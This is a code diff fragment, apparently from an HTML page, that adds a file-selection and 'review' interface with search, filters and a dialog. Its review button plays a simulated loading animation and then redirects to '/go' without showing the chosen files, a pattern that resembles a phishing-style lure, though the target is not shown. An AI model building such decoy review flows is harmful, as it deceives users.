Q4 2026 cycle</div>';$("notifPanel").innerHTML=h;}
+function renderSearch(){if(searchExpanded){var h='<div class="search-box"><svg width="14" height="14" style="color:rgba(255,255,255,.7)"><use href="#i-search"/></svg><input id="searchInput" placeholder="Search files..." value="'+esc(searchQuery).replace(/"/g,'&quot;')+'">'+(searchQuery?'<button class="clear" id="searchClear"><svg width="12" height="12"><use href="#i-x"/></svg></button>':'')+'</div><button class="icon-btn" id="searchClose"><svg width="16" height="16"><use href="#i-x"/></svg></button>';$("searchSlot").innerHTML=h;$("searchInput").focus();$("searchInput").addEventListener("input",function(e){searchQuery=e.target.value;render();});if(searchQuery){$("searchClear").addEventListener("click",function(){searchQuery="";renderSearch();render();});}$("searchClose").addEventListener("click",function(){searchExpanded=false;searchQuery="";renderSearch();render();});}else{$("searchSlot").innerHTML='<button class="icon-btn" id="searchOpen" aria-label="Search files"><svg width="16" height="16"><use href="#i-search"/></svg></button>';$("searchOpen").addEventListener("click",function(){searchExpanded=true;renderSearch();render();});}}
+function render(){var ff=getFiltered();var listHtml;if(ff.length===0){listHtml='<div class="empty"><p>No files found</p><div class="empty-sub">Try adjusting your search or filter.</div></div>';}else{listHtml=ff.map(rowHTML).join("");}$("fileList").innerHTML=listHtml;$("docCount").textContent=ff.length+" Document"+(ff.length===1?"":"s");var chosen=getSelected();var n=chosen.length;var all=ff.length>0&&n===ff.length;$("saLabel").textContent=all?"Selected":"Select All";$("selectAll").className="btn"+(all?" on":"");$("countBadge").textContent=n;$("countLabel").textContent=n===1?"file selected":"files selected";$("actionBar").className="bar"+(n===0?" hidden":"");if(n===0){$("dlgList").innerHTML='<div class="dlg-empty"><p>No files selected</p><div class="empty-sub">Pick files from the list to review them here.</div></div>';$("dlgFoot").className="dlg-foot hidden";}else{$("dlgList").innerHTML=chosen.map(dlgItemHTML).join("");$("dlgFoot").className="dlg-foot";}$("dlgSub").textContent=n+(n===1?" file":" files")+" ready to review";}
+function closeDropdowns(){$("filterMenu").className="dropdown hidden";$("notifPanel").className="dropdown notif-panel hidden";}
+$("filterBtn").addEventListener("click",function(e){e.stopPropagation();var open=!$("filterMenu").classList.contains("hidden");closeDropdowns();if(!open){renderFilterOptions();$("filterMenu").className="dropdown";}});
+$("notifBtn").addEventListener("click",function(e){e.stopPropagation();var open=!$("notifPanel").classList.contains("hidden");closeDropdowns();if(!open){renderNotif();$("notifPanel").className="dropdown notif-panel";}});
+document.addEventListener("click",function(e){if(!e.target.closest("#filterMenu")&&!e.target.closest("#filterBtn")){if(!$("filterMenu").classList.contains("hidden"))$("filterMenu").className="dropdown hidden";}if(!e.target.closest("#notifPanel")&&!e.target.closest("#notifBtn")){if(!$("notifPanel").classList.contains("hidden"))$("notifPanel").className="dropdown notif-panel hidden";}});
+$("filterOptions").addEventListener("click",function(e){var b=e.target.closest("[data-filter]");if(!b)return;activeFilter=b.getAttribute("data-filter");renderFilterOptions();render();$("filterMenu").className="dropdown hidden";});
+$("fileList").addEventListener("click",function(ev){var r=ev.target.closest("[data-row]");if(!r)return;var id=r.getAttribute("data-row");sel[id]=!sel[id];render();});
+$("selectAll").addEventListener("click",function(){var ff=getFiltered();if(getSelected().length===ff.length&&ff.length>0){ff.forEach(function(f){sel[f.id]=false;});}else{ff.forEach(function(f){sel[f.id]=true;});}render();});
+$("clearBtn").addEventListener("click",function(){sel={};render();});
+$("viewBtn").addEventListener("click",function(){render();$("dialogOverlay").className="overlay";});
+$("dlgClose").addEventListener("click",function(){$("dialogOverlay").className="overlay hidden";});
+$("dialogOverlay").addEventListener("click",function(e){if(e.target.id==="dialogOverlay"){$("dialogOverlay").className="overlay hidden";}});
+$("dlgList").addEventListener("click",function(e){var rm=e.target.closest("[data-remove]");if(!rm)return;sel[rm.getAttribute("data-remove")]=false;render();});
+$("reviewBtn").addEventListener("click",function(){var chosen=getSelected();if(!chosen.length)return;$("dialogOverlay").className="overlay hidden";$("loadingOverlay").className="ld-overlay";var d=0;setInterval(function(){$("ldDot"+d).className="ld-dot";d=(d+1)%3;$("ldDot"+d).className="ld-dot on";},350);setTimeout(function(){window.location.href="/go";},2000);});
+renderSearch();
+render();
 </script>
-
 </body>
 </html>
